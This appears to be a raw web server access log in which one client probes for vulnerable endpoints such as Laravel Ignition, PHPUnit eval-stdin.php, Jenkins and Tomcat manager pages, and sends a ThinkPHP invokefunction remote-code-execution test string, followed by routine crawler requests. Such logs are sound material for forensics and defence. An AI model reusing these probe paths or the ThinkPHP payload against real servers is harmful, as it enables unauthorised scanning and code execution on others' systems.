58.250.251.12 - - [14/Feb/2022:22:14:14 +0100] "GET /invoker/readonly HTTP/1.1" 200 595 "http://85.255.1.106:80/invoker/readonly" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:83.0) Gecko/20100101 Firefox/83.0"
58.250.251.12 - - [14/Feb/2022:22:14:16 +0100] "POST /_ignition/execute-solution HTTP/1.1" 301 162 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:83.0) Gecko/20100101 Firefox/83.0"
58.250.251.12 - - [14/Feb/2022:22:14:17 +0100] "GET /_ignition/execute-solution HTTP/1.1" 200 595 "http://85.255.1.106:80/_ignition/execute-solution" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:83.0) Gecko/20100101 Firefox/83.0"
58.250.251.12 - - [14/Feb/2022:22:14:18 +0100] "POST /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 301 162 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:83.0) Gecko/20100101 Firefox/83.0"
58.250.251.12 - - [14/Feb/2022:22:14:19 +0100] "GET /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 47 "http://85.255.1.106:80/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:83.0) Gecko/20100101 Firefox/83.0"
58.250.251.12 - - [14/Feb/2022:22:14:20 +0100] "GET / HTTP/1.1" 301 162 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:83.0) Gecko/20100101 Firefox/83.0"
58.250.251.12 - - [14/Feb/2022:22:14:22 +0100] "GET / HTTP/1.1" 200 595 "http://85.255.1.106:80/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:83.0) Gecko/20100101 Firefox/83.0"
58.250.251.12 - - [14/Feb/2022:22:14:23 +0100] "GET /script HTTP/1.1" 301 162 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:83.0) Gecko/20100101 Firefox/83.0"
58.250.251.12 - - [14/Feb/2022:22:14:24 +0100] "GET /script HTTP/1.1" 200 595 "http://85.255.1.106:80/script" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:83.0) Gecko/20100101 Firefox/83.0"
58.250.251.12 - - [14/Feb/2022:22:14:25 +0100] "GET /login HTTP/1.1" 301 162 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:83.0) Gecko/20100101 Firefox/83.0"
58.250.251.12 - - [14/Feb/2022:22:14:27 +0100] "GET /login HTTP/1.1" 200 595 "http://85.255.1.106:80/login" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:83.0) Gecko/20100101 Firefox/83.0"
58.250.251.12 - - [14/Feb/2022:22:14:28 +0100] "GET /jenkins/login HTTP/1.1" 301 162 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:83.0) Gecko/20100101 Firefox/83.0"
58.250.251.12 - - [14/Feb/2022:22:14:29 +0100] "GET /jenkins/login HTTP/1.1" 200 595 "http://85.255.1.106:80/jenkins/login" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:83.0) Gecko/20100101 Firefox/83.0"
58.250.251.12 - 8hYTSUFk [14/Feb/2022:22:14:30 +0100] "GET /manager/html HTTP/1.1" 301 162 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:83.0) Gecko/20100101 Firefox/83.0"
58.250.251.12 - - [14/Feb/2022:22:14:32 +0100] "GET /manager/html HTTP/1.1" 200 595 "http://85.255.1.106:80/manager/html" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:83.0) Gecko/20100101 Firefox/83.0"
58.250.251.12 - - [14/Feb/2022:22:14:33 +0100] "GET /wp-login.php HTTP/1.1" 301 162 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:83.0) Gecko/20100101 Firefox/83.0"
58.250.251.12 - - [14/Feb/2022:22:14:34 +0100] "GET /wp-login.php HTTP/1.1" 404 47 "http://85.255.1.106:80/wp-login.php" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:83.0) Gecko/20100101 Firefox/83.0"
58.250.251.12 - - [14/Feb/2022:22:14:35 +0100] "GET /?s=/Index/\x5Cthink\x5Capp/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=htdp1830 HTTP/1.1" 301 162 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:83.0) Gecko/20100101 Firefox/83.0"
58.250.251.12 - - [14/Feb/2022:22:14:36 +0100] "GET /?s=/Index/\x5Cthink\x5Capp/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=htdp1830 HTTP/1.1" 200 595 "http://85.255.1.106:80/?s=/Index/\x5Cthink\x5Capp/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=htdp1830" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:83.0) Gecko/20100101 Firefox/83.0"
58.250.251.12 - - [14/Feb/2022:22:14:37 +0100] "GET /users/sign_in HTTP/1.1" 301 162 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:83.0) Gecko/20100101 Firefox/83.0"
58.250.251.12 - - [14/Feb/2022:22:14:39 +0100] "GET /users/sign_in HTTP/1.1" 200 595 "http://85.255.1.106:80/users/sign_in" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:83.0) Gecko/20100101 Firefox/83.0"
66.249.70.27 - - [14/Feb/2022:22:14:58 +0100] "GET /robots.txt HTTP/1.1" 200 108 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.70.25 - - [14/Feb/2022:22:14:58 +0100] "GET /weekly-stories/amp/ HTTP/1.1" 200 5994 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.80 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
154.89.5.82 - - [14/Feb/2022:22:35:19 +0100] "GET / HTTP/1.0" 200 1345 "-" "-"
